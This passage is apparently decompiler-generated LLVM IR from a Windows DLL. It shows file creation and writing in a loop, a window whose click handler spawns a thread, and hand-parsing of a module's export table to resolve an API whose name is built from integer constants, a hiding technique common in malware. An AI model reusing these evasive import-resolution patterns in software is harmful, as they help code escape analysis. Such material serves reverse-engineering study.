  %820 = add i32 %esp.3.reload, -28, !insn.addr !1245
  %821 = inttoptr i32 %820 to i32*, !insn.addr !1245
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %821, align 4, !insn.addr !1245
  store i128 5701723, i128* %stack_var_-108, align 8, !insn.addr !1246
  %822 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1247
  %823 = ptrtoint i32* %822 to i32, !insn.addr !1247
  store i32 %823, i32* @global_var_1003d9b0, align 4, !insn.addr !1248
  store i32 %34, i32* %ecx.14.reg2mem, !insn.addr !1249
  br label %dec_label_pc_10002cf5, !insn.addr !1249

dec_label_pc_10002cf5:                            ; preds = %dec_label_pc_10002cf5, %dec_label_pc_10002cb6
  %ecx.14.reload = load i32, i32* %ecx.14.reg2mem
  %824 = inttoptr i32 %ecx.14.reload to i16*, !insn.addr !1250
  %825 = load i16, i16* %824, align 2, !insn.addr !1250
  %826 = add i32 %ecx.14.reload, 2, !insn.addr !1251
  %827 = icmp eq i16 %825, 0, !insn.addr !1252
  %828 = icmp eq i1 %827, false, !insn.addr !1253
  store i32 %826, i32* %ecx.14.reg2mem, !insn.addr !1253
  store i32 %826, i32* %.pn.reg2mem, !insn.addr !1253
  store i32 %823, i32* %edx.6.reg2mem, !insn.addr !1253
  store i32 %820, i32* %esp.4.reg2mem, !insn.addr !1253
  br i1 %828, label %dec_label_pc_10002cf5, label %dec_label_pc_10002db3, !insn.addr !1253

dec_label_pc_10002d0b:                            ; preds = %dec_label_pc_100025b4
  %829 = add i32 %esp.3.reload, -4, !insn.addr !1254
  %830 = inttoptr i32 %829 to i32*, !insn.addr !1254
  store i32 0, i32* %830, align 4, !insn.addr !1254
  %831 = add i32 %esp.3.reload, -8, !insn.addr !1255
  %832 = inttoptr i32 %831 to i32*, !insn.addr !1255
  store i32 128, i32* %832, align 4, !insn.addr !1255
  %833 = add i32 %esp.3.reload, -12, !insn.addr !1256
  %834 = inttoptr i32 %833 to i32*, !insn.addr !1256
  store i32 4, i32* %834, align 4, !insn.addr !1256
  %835 = add i32 %esp.3.reload, -16, !insn.addr !1257
  %836 = inttoptr i32 %835 to i32*, !insn.addr !1257
  store i32 0, i32* %836, align 4, !insn.addr !1257
  %837 = add i32 %esp.3.reload, -20, !insn.addr !1258
  %838 = inttoptr i32 %837 to i32*, !insn.addr !1258
  store i32 1, i32* %838, align 4, !insn.addr !1258
  %839 = add i32 %esp.3.reload, -24, !insn.addr !1259
  %840 = inttoptr i32 %839 to i32*, !insn.addr !1259
  store i32 4, i32* %840, align 4, !insn.addr !1259
  %841 = add i32 %esp.3.reload, -28, !insn.addr !1260
  %842 = inttoptr i32 %841 to i32*, !insn.addr !1260
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %842, align 4, !insn.addr !1260
  store i128 5701723, i128* %stack_var_-108, align 8, !insn.addr !1261
  %843 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1262
  %844 = ptrtoint i32* %843 to i32, !insn.addr !1262
  store i32 %844, i32* @global_var_1003d9b0, align 4, !insn.addr !1263
  store i32 %34, i32* %ecx.15.reg2mem, !insn.addr !1264
  br label %dec_label_pc_10002d50, !insn.addr !1264

dec_label_pc_10002d50:                            ; preds = %dec_label_pc_10002d50, %dec_label_pc_10002d0b
  %ecx.15.reload = load i32, i32* %ecx.15.reg2mem
  %845 = inttoptr i32 %ecx.15.reload to i16*, !insn.addr !1265
  %846 = load i16, i16* %845, align 2, !insn.addr !1265
  %847 = add i32 %ecx.15.reload, 2, !insn.addr !1266
  %848 = icmp eq i16 %846, 0, !insn.addr !1267
  %849 = icmp eq i1 %848, false, !insn.addr !1268
  store i32 %847, i32* %ecx.15.reg2mem, !insn.addr !1268
  store i32 %847, i32* %.pn.reg2mem, !insn.addr !1268
  store i32 %844, i32* %edx.6.reg2mem, !insn.addr !1268
  store i32 %841, i32* %esp.4.reg2mem, !insn.addr !1268
  br i1 %849, label %dec_label_pc_10002d50, label %dec_label_pc_10002db3, !insn.addr !1268

dec_label_pc_10002d63:                            ; preds = %dec_label_pc_100025b4
  %850 = add i32 %esp.3.reload, -4, !insn.addr !1269
  %851 = inttoptr i32 %850 to i32*, !insn.addr !1269
  store i32 0, i32* %851, align 4, !insn.addr !1269
  %852 = add i32 %esp.3.reload, -8, !insn.addr !1270
  %853 = inttoptr i32 %852 to i32*, !insn.addr !1270
  store i32 128, i32* %853, align 4, !insn.addr !1270
  %854 = add i32 %esp.3.reload, -12, !insn.addr !1271
  %855 = inttoptr i32 %854 to i32*, !insn.addr !1271
  store i32 4, i32* %855, align 4, !insn.addr !1271
  %856 = add i32 %esp.3.reload, -16, !insn.addr !1272
  %857 = inttoptr i32 %856 to i32*, !insn.addr !1272
  store i32 0, i32* %857, align 4, !insn.addr !1272
  %858 = add i32 %esp.3.reload, -20, !insn.addr !1273
  %859 = inttoptr i32 %858 to i32*, !insn.addr !1273
  store i32 1, i32* %859, align 4, !insn.addr !1273
  %860 = add i32 %esp.3.reload, -24, !insn.addr !1274
  %861 = inttoptr i32 %860 to i32*, !insn.addr !1274
  store i32 4, i32* %861, align 4, !insn.addr !1274
  %862 = add i32 %esp.3.reload, -28, !insn.addr !1275
  %863 = inttoptr i32 %862 to i32*, !insn.addr !1275
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %863, align 4, !insn.addr !1275
  store i128 4259931, i128* %stack_var_-108, align 8, !insn.addr !1276
  %864 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1277
  %865 = ptrtoint i32* %864 to i32, !insn.addr !1277
  store i32 %865, i32* @global_var_1003d9b0, align 4, !insn.addr !1278
  store i32 %34, i32* %ecx.16.reg2mem, !insn.addr !1279
  br label %dec_label_pc_10002da2, !insn.addr !1279

dec_label_pc_10002da2:                            ; preds = %dec_label_pc_10002da2, %dec_label_pc_10002d63
  %ecx.16.reload = load i32, i32* %ecx.16.reg2mem
  %866 = inttoptr i32 %ecx.16.reload to i16*, !insn.addr !1280
  %867 = load i16, i16* %866, align 2, !insn.addr !1280
  %868 = add i32 %ecx.16.reload, 2, !insn.addr !1281
  %869 = icmp eq i16 %867, 0, !insn.addr !1282
  %870 = icmp eq i1 %869, false, !insn.addr !1283
  store i32 %868, i32* %ecx.16.reg2mem, !insn.addr !1283
  store i32 %868, i32* %.pn.reg2mem, !insn.addr !1283
  store i32 %865, i32* %edx.6.reg2mem, !insn.addr !1283
  store i32 %862, i32* %esp.4.reg2mem, !insn.addr !1283
  br i1 %870, label %dec_label_pc_10002da2, label %dec_label_pc_10002db3, !insn.addr !1283

dec_label_pc_10002db3:                            ; preds = %dec_label_pc_10002d50, %dec_label_pc_10002cf5, %dec_label_pc_10002795, %dec_label_pc_10002ca0, %dec_label_pc_10002c45, %dec_label_pc_10002bf0, %dec_label_pc_10002b90, %dec_label_pc_10002da2, %dec_label_pc_10002740, %dec_label_pc_10002637, %dec_label_pc_100026e5, %dec_label_pc_10002690, %dec_label_pc_10002b36
  %esp.4.reload = load i32, i32* %esp.4.reg2mem
  %edx.6.reload = load i32, i32* %edx.6.reg2mem
  %.pn.reload = load i32, i32* %.pn.reg2mem
  %ecx.17 = sub i32 %.pn.reload, %35
  %871 = add i32 %esp.4.reload, -4, !insn.addr !1284
  %872 = inttoptr i32 %871 to i32*, !insn.addr !1284
  store i32 0, i32* %872, align 4, !insn.addr !1284
  %873 = and i32 %ecx.17, -2
  %874 = add i32 %esp.4.reload, -8, !insn.addr !1285
  %875 = inttoptr i32 %874 to i32*, !insn.addr !1285
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %875, align 4, !insn.addr !1285
  %876 = add i32 %esp.4.reload, -12, !insn.addr !1286
  %877 = inttoptr i32 %876 to i32*, !insn.addr !1286
  store i32 %873, i32* %877, align 4, !insn.addr !1286
  %878 = add i32 %esp.4.reload, -16, !insn.addr !1287
  %879 = inttoptr i32 %878 to i32*, !insn.addr !1287
  store i32 %34, i32* %879, align 4, !insn.addr !1287
  %880 = add i32 %esp.4.reload, -20, !insn.addr !1288
  %881 = inttoptr i32 %880 to i32*, !insn.addr !1288
  store i32 %edx.6.reload, i32* %881, align 4, !insn.addr !1288
  store i32 %880, i32* %esp.5.reg2mem, !insn.addr !1288
  br label %dec_label_pc_10002dc5, !insn.addr !1288

dec_label_pc_10002dc5:                            ; preds = %dec_label_pc_10002ac4, %dec_label_pc_10002a95, %dec_label_pc_10002a66, %dec_label_pc_10002a37, %dec_label_pc_10002a08, %dec_label_pc_100029d9, %dec_label_pc_100029aa, %dec_label_pc_1000297b, %dec_label_pc_1000294c, %dec_label_pc_1000291d, %dec_label_pc_100028ee, %dec_label_pc_100028bf, %dec_label_pc_10002890, %dec_label_pc_10002852, %dec_label_pc_10002814, %dec_label_pc_10002db3, %dec_label_pc_100025d3
  %esp.5.reload = load i32, i32* %esp.5.reg2mem
  %882 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !1289
  %883 = load i32, i32* @global_var_1003d9b0, align 4, !insn.addr !1290
  %884 = add i32 %esp.5.reload, -4, !insn.addr !1290
  %885 = inttoptr i32 %884 to i32*, !insn.addr !1290
  store i32 %883, i32* %885, align 4, !insn.addr !1290
  %886 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !1291
  store i32 %164, i32* %.pre-phi.reg2mem, !insn.addr !1291
  store i32 %884, i32* %esp.6.reg2mem, !insn.addr !1291
  br label %dec_label_pc_10002dcf, !insn.addr !1291

dec_label_pc_10002dcf:                            ; preds = %dec_label_pc_10002423.dec_label_pc_10002dcf_crit_edge, %dec_label_pc_10002881, %dec_label_pc_10002843, %dec_label_pc_100027c9, %dec_label_pc_100027ba, %dec_label_pc_100027ab, %dec_label_pc_10002dc5, %dec_label_pc_100025b4
  %esp.6.reload = load i32, i32* %esp.6.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %887 = add i32 %.pre-phi.reload, 1, !insn.addr !1292
  %888 = inttoptr i32 %887 to i16*, !insn.addr !1293
  %889 = icmp slt i32 %887, 223, !insn.addr !1294
  store i16* %888, i16** %stack_var_-216.0.reg2mem, !insn.addr !1294
  store i32 %887, i32* %eax.0.reg2mem, !insn.addr !1294
  store i32 %esp.6.reload, i32* %esp.1.reg2mem, !insn.addr !1294
  store i32 %esp.6.reload, i32* %esp.0.be.reg2mem, !insn.addr !1294
  br i1 %889, label %dec_label_pc_10002423, label %dec_label_pc_10002410.backedge, !insn.addr !1294

dec_label_pc_10002def:                            ; preds = %dec_label_pc_1000259e
  %890 = call i32 @function_10001ff0(), !insn.addr !1295
  store i32 %esp.3.reload, i32* %esp.0.be.reg2mem, !insn.addr !1296
  br label %dec_label_pc_10002410.backedge, !insn.addr !1296

dec_label_pc_10002410.backedge:                   ; preds = %dec_label_pc_10002dcf, %dec_label_pc_10002def
  %esp.0.be.reload = load i32, i32* %esp.0.be.reg2mem
  store i32 %esp.0.be.reload, i32* %esp.0.reg2mem
  br label %dec_label_pc_10002410
}

define i32 @function_10002f5e(i32 %arg1) local_unnamed_addr {
dec_label_pc_10002f5e:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__asm_int3(), !insn.addr !1297
  %2 = icmp eq i32 %arg1, 513, !insn.addr !1298
  br i1 %2, label %dec_label_pc_10002f87, label %dec_label_pc_10002f7d, !insn.addr !1299

dec_label_pc_10002f7d:                            ; preds = %dec_label_pc_10002f5e
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1300
  %4 = call i32 @DefWindowProcW(i32* %3, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1300
  ret i32 %4, !insn.addr !1300

dec_label_pc_10002f87:                            ; preds = %dec_label_pc_10002f5e
  %5 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 0, i32 (i32*)* inttoptr (i32 268444368 to i32 (i32*)*), i32* null, i32 0, i32* nonnull @global_var_1004002c), !insn.addr !1301
  ret i32 0, !insn.addr !1302
}

define i32 @function_10002fb0() local_unnamed_addr {
dec_label_pc_10002fb0:
  %esp.1.reg2mem = alloca i32, !insn.addr !1303
  %edi.0.reg2mem = alloca i32, !insn.addr !1303
  %esp.0.reg2mem = alloca i32, !insn.addr !1303
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-564 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-468 = alloca i16*, align 4
  %stack_var_-312 = alloca i32, align 4
  %1 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10039298, i32 0, i32 0)), !insn.addr !1304
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1304
  store i32 1684107084, i32* %stack_var_-312, align 4, !insn.addr !1305
  %3 = add i32 %2, 60, !insn.addr !1306
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1306
  %5 = load i32, i32* %4, align 4, !insn.addr !1306
  %6 = add i32 %2, 120, !insn.addr !1307
  %7 = add i32 %6, %5, !insn.addr !1307
  %8 = inttoptr i32 %7 to i32*, !insn.addr !1307
  %9 = load i32, i32* %8, align 4, !insn.addr !1307
  %10 = add i32 %9, %2, !insn.addr !1308
  %11 = call i32 @function_10009e60(i32 %2, i32* nonnull %stack_var_-312), !insn.addr !1309
  %12 = add i32 %10, 36, !insn.addr !1310
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1310
  %14 = load i32, i32* %13, align 4, !insn.addr !1310
  %15 = mul i32 %11, 2, !insn.addr !1311
  %16 = add i32 %15, %2, !insn.addr !1311
  %17 = add i32 %16, %14, !insn.addr !1312
  %18 = inttoptr i32 %17 to i16*, !insn.addr !1312
  %19 = load i16, i16* %18, align 2, !insn.addr !1312
  %20 = zext i16 %19 to i32, !insn.addr !1312
  %21 = add i32 %10, 28, !insn.addr !1313
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1313
  %23 = load i32, i32* %22, align 4, !insn.addr !1313
  %24 = mul i32 %20, 4, !insn.addr !1314
  %25 = add i32 %23, %2, !insn.addr !1314
  %26 = add i32 %25, %24, !insn.addr !1315
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1315
  %28 = load i32, i32* %27, align 4, !insn.addr !1315
  %29 = add i32 %28, %2, !insn.addr !1316
  store i32 1919251285, i32* %stack_var_-312, align 4, !insn.addr !1317
  store i32 %29, i32* @global_var_1003ed04, align 4, !insn.addr !1318
  %30 = call i32 @GetTickCount(), !insn.addr !1319
  call void @_srand(i32 %30), !insn.addr !1320
  %31 = call i32 @GetTempPathW(i32 260, i16* bitcast (i16** @global_var_1003fd10 to i16*)), !insn.addr !1321
  %32 = load i128, i128* @global_var_10039960, align 4, !insn.addr !1322
  %33 = call i128 @__asm_movaps(i128 %32), !insn.addr !1322
  call void @__asm_movups(i128 undef, i128 %33), !insn.addr !1323
  %34 = call i16* @lstrcatW(i16* inttoptr (i32 7602273 to i16*), i16* null), !insn.addr !1324
  store i16* bitcast (i16** @global_var_1003fd10 to i16*), i16** %stack_var_-468, align 4, !insn.addr !1325
  %35 = ptrtoint i16** %stack_var_-468 to i32, !insn.addr !1325
  %36 = call i32* @CreateFileW(i16* bitcast (i16** @global_var_1003fd10 to i16*), i32 1, i32 1, %_SECURITY_ATTRIBUTES* null, i32 3, i32 128, i32* null), !insn.addr !1326
  %37 = ptrtoint i32* %36 to i32, !insn.addr !1326
  %38 = icmp eq i32* %36, inttoptr (i32 -1 to i32*), !insn.addr !1327
  %39 = icmp eq i1 %38, false, !insn.addr !1328
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !1328
  store i32 %37, i32* %edi.0.reg2mem, !insn.addr !1328
  br i1 %39, label %dec_label_pc_1000317a, label %dec_label_pc_100030d6, !insn.addr !1328

dec_label_pc_100030d6:                            ; preds = %dec_label_pc_10002fb0
  %40 = call i32* @CreateFileW(i16* bitcast (i16** @global_var_1003fd10 to i16*), i32 2, i32 1, %_SECURITY_ATTRIBUTES* null, i32 2, i32 128, i32* null), !insn.addr !1329
  %41 = ptrtoint i32* %40 to i32, !insn.addr !1329
  %42 = call i1 @WriteFile(i32* %40, i32* nonnull @global_var_1003d9b4, i32 2, i32* nonnull @global_var_10040020, %_OVERLAPPED* null), !insn.addr !1330
  %43 = load i128, i128* @global_var_10039c60, align 4, !insn.addr !1331
  %44 = call i128 @__asm_movaps(i128 %43), !insn.addr !1331
  %45 = sext i32 %0 to i128, !insn.addr !1332
  call void @__asm_movups(i128 %45, i128 %44), !insn.addr !1332
  %46 = call i1 @WriteFile(i32* inttoptr (i32 1835093620 to i32*), i32* inttoptr (i16 22373 to i32*), i32 0, i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !1333
  %47 = call i32 @function_10009390(), !insn.addr !1334
  %48 = bitcast i32* %stack_var_-340 to i16*
  %49 = call i32 @lstrlenW(i16* nonnull %48), !insn.addr !1335
  %50 = mul i32 %49, 2, !insn.addr !1336
  store i32 %41, i32* %stack_var_-564, align 4, !insn.addr !1337
  %51 = ptrtoint i32* %stack_var_-564 to i32, !insn.addr !1337
  %52 = call i1 @WriteFile(i32* %40, i32* nonnull %stack_var_-344, i32 %50, i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !1338
  store i32 %51, i32* %esp.0.reg2mem, !insn.addr !1338
  store i32 %41, i32* %edi.0.reg2mem, !insn.addr !1338
  br label %dec_label_pc_1000317a, !insn.addr !1338

dec_label_pc_1000317a:                            ; preds = %dec_label_pc_100030d6, %dec_label_pc_10002fb0
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %53 = add i32 %esp.0.reload, -4, !insn.addr !1339
  %54 = inttoptr i32 %53 to i32*, !insn.addr !1339
  store i32 %edi.0.reload, i32* %54, align 4, !insn.addr !1339
  %55 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !1340
  %56 = add i32 %esp.0.reload, 156, !insn.addr !1341
  %57 = inttoptr i32 %56 to i32*, !insn.addr !1341
  store i32 7929933, i32* %57, align 4, !insn.addr !1341
  %58 = add i32 %esp.0.reload, 160, !insn.addr !1342
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1342
  store i32 7536707, i32* %59, align 4, !insn.addr !1342
  %60 = add i32 %esp.0.reload, 164, !insn.addr !1343
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1343
  store i32 3211340, i32* %61, align 4, !insn.addr !1343
  %62 = add i32 %esp.0.reload, 168, !insn.addr !1344
  %63 = inttoptr i32 %62 to i16*, !insn.addr !1344
  store i16 0, i16* %63, align 2, !insn.addr !1344
  %64 = call i32* @GetDesktopWindow(), !insn.addr !1345
  %65 = ptrtoint i32* %64 to i32, !insn.addr !1345
  %66 = add i32 %esp.0.reload, 88, !insn.addr !1346
  %67 = add i32 %esp.0.reload, -8, !insn.addr !1347
  %68 = inttoptr i32 %67 to i32*, !insn.addr !1347
  store i32 %66, i32* %68, align 4, !insn.addr !1347
  %69 = add i32 %esp.0.reload, -12, !insn.addr !1348
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1348
  store i32 %65, i32* %70, align 4, !insn.addr !1348
  %71 = call i1 @GetWindowRect(i32* nonnull @1, %tagRECT* bitcast (i32* @1 to %tagRECT*)), !insn.addr !1349
  %72 = inttoptr i32 %66 to i32*, !insn.addr !1350
  %73 = load i32, i32* %72, align 4, !insn.addr !1350
  %74 = add i32 %esp.0.reload, 92, !insn.addr !1351
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1351
  %76 = load i32, i32* %75, align 4, !insn.addr !1351
  %77 = add i32 %esp.0.reload, -16, !insn.addr !1352
  %78 = inttoptr i32 %77 to i32*, !insn.addr !1352
  store i32 0, i32* %78, align 4, !insn.addr !1352
  %79 = add i32 %esp.0.reload, 4, !insn.addr !1353
  %80 = inttoptr i32 %79 to i32*, !insn.addr !1353
  store i32 48, i32* %80, align 4, !insn.addr !1353
  %81 = add i32 %esp.0.reload, 8, !insn.addr !1354
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1354
  store i32 8, i32* %82, align 4, !insn.addr !1354
  %83 = add i32 %esp.0.reload, 12, !insn.addr !1355
  %84 = inttoptr i32 %83 to i32*, !insn.addr !1355
  store i32 268447600, i32* %84, align 4, !insn.addr !1355
  %85 = add i32 %esp.0.reload, 16, !insn.addr !1356
  %86 = inttoptr i32 %85 to i32*, !insn.addr !1356
  store i32 0, i32* %86, align 4, !insn.addr !1356
  %87 = add i32 %esp.0.reload, 20, !insn.addr !1357
  %88 = inttoptr i32 %87 to i32*, !insn.addr !1357
  store i32 0, i32* %88, align 4, !insn.addr !1357
  %89 = call i32* @GetModuleHandleW(i16* bitcast (i32* @1 to i16*)), !insn.addr !1358
  %90 = ptrtoint i32* %89 to i32, !insn.addr !1358
  %91 = add i32 %esp.0.reload, -20, !insn.addr !1359
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1359
  store i32 32512, i32* %92, align 4, !insn.addr !1359
  %93 = add i32 %esp.0.reload, -24, !insn.addr !1360
  %94 = inttoptr i32 %93 to i32*, !insn.addr !1360
  store i32 0, i32* %94, align 4, !insn.addr !1360
  store i32 %90, i32* %88, align 4, !insn.addr !1361
  %95 = add i32 %esp.0.reload, 24, !insn.addr !1362
  %96 = inttoptr i32 %95 to i32*, !insn.addr !1362
  store i32 0, i32* %96, align 4, !insn.addr !1362
  %97 = call i32* @LoadCursorW(i32* nonnull @1, i16* bitcast (i32* @1 to i16*)), !insn.addr !1363
  %98 = ptrtoint i32* %97 to i32, !insn.addr !1363
  store i32 %98, i32* %88, align 4, !insn.addr !1364
  %99 = add i32 %esp.0.reload, 136, !insn.addr !1365
  %100 = add i32 %esp.0.reload, -28, !insn.addr !1366
  %101 = inttoptr i32 %100 to i32*, !insn.addr !1366
  store i32 32512, i32* %101, align 4, !insn.addr !1366
  %102 = add i32 %esp.0.reload, -32, !insn.addr !1367
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1367
  store i32 0, i32* %103, align 4, !insn.addr !1367
  store i32 6, i32* %96, align 4, !insn.addr !1368
  %104 = add i32 %esp.0.reload, 28, !insn.addr !1369
  %105 = inttoptr i32 %104 to i32*, !insn.addr !1369
  store i32 0, i32* %105, align 4, !insn.addr !1369
  %106 = add i32 %esp.0.reload, 32, !insn.addr !1370
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1370
  store i32 %99, i32* %107, align 4, !insn.addr !1370
  %108 = call i32* @LoadIconW(i32* nonnull @1, i16* bitcast (i32* @1 to i16*)), !insn.addr !1371
  %109 = ptrtoint i32* %108 to i32, !insn.addr !1371
  %110 = load i128, i128* @global_var_10039ae0, align 4, !insn.addr !1372
  %111 = call i128 @__asm_movaps(i128 %110), !insn.addr !1372
  store i32 %109, i32* %105, align 4, !insn.addr !1373
  %112 = add i32 %esp.0.reload, 76, !insn.addr !1374
  %113 = inttoptr i32 %112 to i128*, !insn.addr !1374
  %114 = load i128, i128* %113, align 4, !insn.addr !1374
  call void @__asm_movups(i128 %114, i128 %111), !insn.addr !1374
  %115 = inttoptr i32 %74 to i8*, !insn.addr !1375
  store i8 0, i8* %115, align 1, !insn.addr !1375
  %116 = call i32 @function_10009390(), !insn.addr !1376
  %117 = add i32 %esp.0.reload, -36, !insn.addr !1377
  %118 = inttoptr i32 %117 to i32*, !insn.addr !1377
  store i32 %77, i32* %118, align 4, !insn.addr !1377
  %119 = add i32 %esp.0.reload, -40, !insn.addr !1378
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1378
  store i32 0, i32* %120, align 4, !insn.addr !1378
  %121 = add i32 %esp.0.reload, -44, !insn.addr !1379
  %122 = inttoptr i32 %121 to i32*, !insn.addr !1379
  store i32 0, i32* %122, align 4, !insn.addr !1379
  %123 = call i32* @GetModuleHandleW(i16* bitcast (i32* @1 to i16*)), !insn.addr !1380
  %124 = ptrtoint i32* %123 to i32, !insn.addr !1380
  %125 = add i32 %esp.0.reload, -48, !insn.addr !1381
  %126 = inttoptr i32 %125 to i32*, !insn.addr !1381
  store i32 %124, i32* %126, align 4, !insn.addr !1381
  %127 = add i32 %esp.0.reload, -52, !insn.addr !1382
  %128 = inttoptr i32 %127 to i32*, !insn.addr !1382
  store i32 0, i32* %128, align 4, !insn.addr !1382
  %129 = add i32 %esp.0.reload, -56, !insn.addr !1383
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1383
  store i32 0, i32* %130, align 4, !insn.addr !1383
  %131 = add i32 %esp.0.reload, -60, !insn.addr !1384
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1384
  store i32 1, i32* %132, align 4, !insn.addr !1384
  %133 = add i32 %esp.0.reload, -64, !insn.addr !1385
  %134 = inttoptr i32 %133 to i32*, !insn.addr !1385
  store i32 1, i32* %134, align 4, !insn.addr !1385
  %135 = add i32 %esp.0.reload, -68, !insn.addr !1386
  %136 = inttoptr i32 %135 to i32*, !insn.addr !1386
  store i32 %76, i32* %136, align 4, !insn.addr !1386
  %137 = add i32 %esp.0.reload, -72, !insn.addr !1387
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1387
  store i32 %73, i32* %138, align 4, !insn.addr !1387
  %139 = add i32 %esp.0.reload, -76, !insn.addr !1388
  %140 = inttoptr i32 %139 to i32*, !insn.addr !1388
  store i32 655360, i32* %140, align 4, !insn.addr !1388
  %141 = add i32 %esp.0.reload, -80, !insn.addr !1389
  %142 = inttoptr i32 %141 to i32*, !insn.addr !1389
  store i32 ptrtoint (i32* @global_var_10039154 to i32), i32* %142, align 4, !insn.addr !1389
  %143 = add i32 %esp.0.reload, 120, !insn.addr !1390
  %144 = add i32 %esp.0.reload, -84, !insn.addr !1391
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1391
  store i32 %143, i32* %145, align 4, !insn.addr !1391
  %146 = add i32 %esp.0.reload, -88, !insn.addr !1392
  %147 = inttoptr i32 %146 to i32*, !insn.addr !1392
  store i32 0, i32* %147, align 4, !insn.addr !1392
  %148 = call i32* @CreateWindowExW(i32 ptrtoint (i32* @1 to i32), i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, i32* nonnull @1, i32* nonnull @1, i32* nonnull @1), !insn.addr !1393
  %149 = ptrtoint i32* %148 to i32, !insn.addr !1393
  %150 = add i32 %esp.0.reload, -92, !insn.addr !1394
  %151 = inttoptr i32 %150 to i32*, !insn.addr !1394
  store i32 0, i32* %151, align 4, !insn.addr !1394
  %152 = add i32 %esp.0.reload, -96, !insn.addr !1395
  %153 = inttoptr i32 %152 to i32*, !insn.addr !1395
  store i32 %149, i32* %153, align 4, !insn.addr !1395
  store i32 %149, i32* @global_var_1003ff2c, align 4, !insn.addr !1396
  %154 = call i1 @ShowWindow(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1397
  %155 = load i32, i32* @global_var_1003ff2c, align 4, !insn.addr !1398
  %156 = add i32 %esp.0.reload, -100, !insn.addr !1398
  %157 = inttoptr i32 %156 to i32*, !insn.addr !1398
  store i32 %155, i32* %157, align 4, !insn.addr !1398
  %158 = call i1 @UpdateWindow(i32* nonnull @1), !insn.addr !1399
  store i32 1953722192, i32* %82, align 4, !insn.addr !1400
  store i32 1936942413, i32* %84, align 4, !insn.addr !1401
  store i32 1097164641, i32* %86, align 4, !insn.addr !1402
  %159 = inttoptr i32 %87 to i8*, !insn.addr !1403
  store i8 0, i8* %159, align 1, !insn.addr !1403
  %160 = call i32 @function_10009390(), !insn.addr !1404
  %161 = add i32 %esp.0.reload, -104, !insn.addr !1405
  %162 = inttoptr i32 %161 to i32*, !insn.addr !1405
  store i32 0, i32* %162, align 4, !insn.addr !1405
  %163 = add i32 %esp.0.reload, -108, !insn.addr !1406
  %164 = inttoptr i32 %163 to i32*, !insn.addr !1406
  store i32 0, i32* %164, align 4, !insn.addr !1406
  %165 = add i32 %esp.0.reload, -112, !insn.addr !1407
  %166 = inttoptr i32 %165 to i32*, !insn.addr !1407
  store i32 513, i32* %166, align 4, !insn.addr !1407
  %167 = load i32, i32* @global_var_1003ff2c, align 4, !insn.addr !1408
  %168 = add i32 %esp.0.reload, -116, !insn.addr !1408
  %169 = inttoptr i32 %168 to i32*, !insn.addr !1408
  store i32 %167, i32* %169, align 4, !insn.addr !1408
  store i32 1299473735, i32* %68, align 4, !insn.addr !1409
